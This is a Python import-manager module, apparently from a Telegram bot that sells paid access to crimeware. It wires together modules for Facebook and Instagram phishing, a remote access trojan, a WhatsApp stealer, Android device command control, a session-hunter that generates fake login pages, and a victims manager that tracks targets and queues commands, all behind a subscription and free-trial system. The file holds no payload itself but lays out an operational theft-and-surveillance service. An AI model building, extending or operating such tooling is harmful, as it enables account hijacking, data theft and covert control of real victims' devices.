# imports_manager.py
# ============================================================
# استيراد كل الأدوات مع Fallback آمن
# ============================================================

import io
from telebot.types import InlineKeyboardMarkup

from logging_config import get_logger

logger = get_logger("imports_manager")


# ============================================================
# Facebook
# ============================================================
try:
    from facebook_module import init_facebook_routes
    logger.info("[+] facebook_module imported")
except Exception as e:
    logger.error(f"facebook_module: {e}")
    init_facebook_routes = lambda app, bot: None


# ============================================================
# Instagram
# ============================================================
try:
    from instagram_module import init_instagram_routes
    logger.info("[+] instagram_module imported")
except Exception as e:
    logger.error(f"instagram_module: {e}")
    init_instagram_routes = lambda app, bot: None


# ============================================================
# RAT
# ============================================================
try:
    from rat_module import init_rat_routes, rat_bp, queue_command
    logger.info("[+] rat_module imported")
except Exception as e:
    logger.error(f"rat_module: {e}")
    init_rat_routes = lambda app, bot: None
    rat_bp = None
    queue_command = lambda *args: None


# ============================================================
# QR
# ============================================================
try:
    from qr_pairing import init_qr_routes, qr_bp, generate_qr_code_bytes
    logger.info("[+] qr_pairing imported")
except Exception as e:
    logger.error(f"qr_pairing: {e}")
    init_qr_routes = lambda app, bot: None
    qr_bp = None
    generate_qr_code_bytes = lambda *args: None


# ============================================================
# LSH
# ============================================================
try:
    from lsh import (
        init_lsh_routes, lsh_bp,
        generate_qr_code_bytes as lsh_generate_qr,
        set_bot_reference,
        push_command as lsh_push_command,
        get_session as lsh_get_session,
        build_lsh_control_panel,
    )
    LSH_ENABLED = True
    logger.info("[+] lsh imported")
except Exception as e:
    logger.exception(f"lsh: {e}")
    LSH_ENABLED = False

    def init_lsh_routes(app, bot):
        pass

    def set_bot_reference(bot):
        pass

    def lsh_push_command(*a, **kw):
        return False

    def lsh_get_session(*a, **kw):
        return None

    def lsh_generate_qr(*a, **kw):
        return io.BytesIO()

    def build_lsh_control_panel(*a, **kw):
        return InlineKeyboardMarkup()

    lsh_bp = None


# ============================================================
# Session Hunter
# ============================================================
try:
    from session_hunter import (
        init_session_hunter_routes, sh_bp, get_sh_data,
        build_sh_panel, SUPPORTED_SITES,
        create_session as sh_create_session,
        generate_login_page as sh_generate_login_page,
    )
    SH_ENABLED = True
    logger.info("[+] session_hunter imported")
except Exception as e:
    logger.error(f"session_hunter: {e}")
    SH_ENABLED = False

    def init_session_hunter_routes(app, bot):
        pass

    sh_bp = None

    def get_sh_data(sid):
        return {}

    def build_sh_panel(sid, cid):
        return InlineKeyboardMarkup()

    SUPPORTED_SITES = {}

    def sh_create_session(*a, **kw):
        return None

    def sh_generate_login_page(*a, **kw):
        return "Error"


# ============================================================
# WhatsApp Stealer
# ============================================================
try:
    from wa_stealer import (
        init_whatsapp_stealer_routes,
        wa_bp,
        get_wa_data,
        build_wa_panel,
        create_wa_session,
        get_wa_session,
    )
    WA_ENABLED = True
    logger.info("[+] wa_stealer imported")
except Exception as e:
    logger.error(f"wa_stealer: {e}")
    WA_ENABLED = False

    def init_whatsapp_stealer_routes(app, bot):
        pass

    wa_bp = None

    def get_wa_data(session_id):
        return {"storage": None, "idb": None, "chunks_count": 0}

    def build_wa_panel(session_id, chat_id):
        return InlineKeyboardMarkup()

    def create_wa_session(session_id, chat_id):
        return None

    def get_wa_session(session_id):
        return None


# ============================================================
# APK Manager
# ============================================================
try:
    from apk_manager import (
        init_apk_routes,
        apk_bp,
        build_apk_panel,
        push_apk_command,
        create_apk_code,
        get_apk_code,
        get_apk_devices,
        get_apk_device,
    )
    APK_MANAGER_ENABLED = True
    logger.info("[+] apk_manager imported")
except Exception as e:
    logger.error(f"apk_manager: {e}")
    APK_MANAGER_ENABLED = False

    def init_apk_routes(app, bot):
        pass

    apk_bp = None

    def build_apk_panel(device_id):
        return InlineKeyboardMarkup()

    def push_apk_command(*a, **kw):
        return False

    def create_apk_code(chat_id):
        return None

    def get_apk_code(code):
        return None

    def get_apk_devices():
        return []

    def get_apk_device(device_id):
        return None


# ============================================================
# Victims Manager
# ============================================================
try:
    from victims_manager import (
        create_victim, get_victim, get_all_victims, delete_victim,
        update_victim_status, rename_victim,
        find_victim_by_token, register_victim_device,
        add_victim_data, get_victim_data,
        queue_victim_command, pop_victim_commands,
        get_victim_stats, has_victim_commands,
    )
    VICTIMS_ENABLED = True
    logger.info("[+] victims_manager imported")
except Exception as e:
    logger.exception(f"victims_manager: {e}")
    VICTIMS_ENABLED = False

    def create_victim(*a, **kw):
        return None

    def get_victim(*a, **kw):
        return None

    def get_all_victims(*a, **kw):
        return []

    def delete_victim(*a, **kw):
        return False

    def update_victim_status(*a, **kw):
        return False

    def rename_victim(*a, **kw):
        return False

    def find_victim_by_token(*a, **kw):
        return None

    def register_victim_device(*a, **kw):
        return False

    def add_victim_data(*a, **kw):
        return False

    def get_victim_data(*a, **kw):
        return []

    def queue_victim_command(*a, **kw):
        return False

    def pop_victim_commands(*a, **kw):
        return []

    def get_victim_stats(*a, **kw):
        return {}

    def has_victim_commands(*a, **kw):
        return False


# ============================================================
# Stars Payment
# ============================================================
try:
    from stars_payment import (
        register_payment_handlers, get_or_create_user, can_use_tool,
        consume_usage, build_plans_keyboard, build_main_payment_keyboard,
        build_account_text, build_plans_text, send_invoice,
        PRICING_PLANS, FREE_TRIAL_USES, AVAILABLE_TOOLS,
        is_admin, is_vip, get_all_users, get_user, save_user,
        delete_user, ban_user, unban_user, activate_subscription,
        build_admin_menu, build_admin_users_keyboard,
        build_user_detail_keyboard, build_user_info_text,
        build_admin_stats_text, ADMIN_IDS, VIP_IDS,
    )
    PAYMENT_ENABLED = True
    logger.info("[+] stars_payment imported")
except Exception as e:
    logger.error(f"stars_payment: {e}")
    PAYMENT_ENABLED = False

    def register_payment_handlers(bot):
        pass

    def get_or_create_user(*a, **kw):
        return {}

    def can_use_tool(*a, **kw):
        return {"allowed": True, "reason": "bypass"}

    def consume_usage(*a, **kw):
        return True

    def build_plans_keyboard():
        return InlineKeyboardMarkup()

    def build_main_payment_keyboard():
        return InlineKeyboardMarkup()

    def build_account_text(*a, **kw):
        return "نظام الدفع معطّل"

    def build_plans_text():
        return "نظام الدفع معطّل"

    def send_invoice(*a, **kw):
        pass

    PRICING_PLANS = {}
    FREE_TRIAL_USES = 3
    AVAILABLE_TOOLS = ["fb", "ig", "qr", "rat", "lsh", "sh", "apk", "wa"]

    def is_admin(uid):
        return False

    def is_vip(uid):
        return False

    def get_all_users():
        return []

    def get_user(uid):
        return None

    def save_user(uid, u):
        return False

    def delete_user(uid):
        return False

    def ban_user(uid):
        return False

    def unban_user(uid):
        return False

    def activate_subscription(uid, pk):
        return {}

    def build_admin_menu():
        return InlineKeyboardMarkup()

    def build_admin_users_keyboard(*a, **kw):
        return InlineKeyboardMarkup()

    def build_user_detail_keyboard(*a, **kw):
        return InlineKeyboardMarkup()

    def build_user_info_text(*a, **kw):
        return ""

    def build_admin_stats_text():
        return ""

    ADMIN_IDS = []
    VIP_IDS = []


# ============================================================
# ملخص الاستيراد
# ============================================================
logger.info(
    f"Imports Summary | "
    f"LSH={LSH_ENABLED} | "
    f"SH={SH_ENABLED} | "
    f"WA={WA_ENABLED} | "
    f"APK_MGR={APK_MANAGER_ENABLED} | "
    f"VICTIMS={VICTIMS_ENABLED} | "
    f"PAYMENT={PAYMENT_ENABLED}"
    )
